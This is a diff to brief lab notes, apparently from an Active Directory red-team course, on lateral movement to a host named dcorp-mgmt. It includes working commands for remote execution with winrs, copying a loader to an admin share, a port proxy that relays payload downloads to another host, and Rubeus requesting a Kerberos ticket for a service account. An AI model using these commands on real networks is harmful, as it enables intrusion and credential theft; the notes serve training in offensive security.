@@ -19,11 +19,13 @@ Find-DomainUserLocation
 
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
+### Lateral 1
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
 ```
 
@@ -39,3 +41,8 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 ```
 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
+
+### Lateral 2
+```powershell
+
+```
